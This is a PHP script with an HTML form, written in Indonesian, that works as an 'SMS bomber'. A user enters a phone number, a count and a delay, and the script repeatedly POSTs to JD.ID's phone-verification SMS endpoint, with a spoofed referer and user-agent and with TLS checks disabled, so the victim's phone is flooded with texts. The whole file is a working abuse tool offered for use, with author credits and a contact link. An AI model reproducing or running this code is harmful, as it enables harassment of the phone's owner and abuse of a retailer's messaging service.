<?php
    error_reporting(0);
    
    $delay = trim($_POST["delay"]);
    $jumlah = trim($_POST["jumlah"]);
    $nope = trim($_POST["nope"]);
    $submit = $_POST["submit"];

function jdidbom($no, $jum, $wait){
    $x = 0; 
    while($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
		echo $server_output."\n";
        sleep($wait);
        $x++;
        flush();
    }
}
//print "SMS BOMBER BY kakatoji\n";
//print "https://fb.me/kakaroto.kakaroto.3382\n\n\n";

   if(isset($submit)){
    
    jdidbom($nope,$jumlah,$delay);
    
  }
?>
<!DOCUMENT html>
<html>
<head><title>joy bom</title></head>
<style type="text/css">

 body{
       background-color:orange;
       text-align:left;
       font-size:20%;
 }
 
 .container{
      
      left:50%;
      top :50%;
 transform:translate(-50%,50%);
   overflow:hidden;
   position:absolute;
 }
 
 .kaka{
       font-size:60%;
       color:blue;
 }
 
 h2{
    color:black;
    font-size:30;
    text-align:center;
 
 }
</style>
<body>

<h1 style="color:green;font-size:40;">Bom sms joy id</h1>

<form action="" method="POST">
<span class="kaka">No Tlpn :</span>
<input type="text" name="nope" placeholder="0852XXXXXXXX"><br>
<span class="kaka">Jumlah :</span>
<input type:"text" name="jumlah" placeholder="0-9999999"><br>
<span class="kaka">Delay :</span>
<input type="text" name="delay" placeholder="0,005"><br>
<button type="submit" name="submit">Tembak </button>

<h2> Terimakasih telah memakai tools kami.<br> jika kurang jelas inbox my <a href="https://www.facebook.com/kakaroto.kakaroto.3328">FACEBOOK</a> terimakasih.</h2><br><br>

@copyright by <a href="https://facebook.com/kakaroto.kakaroto.3328">KAKATOJI</a>

</body>







</html>
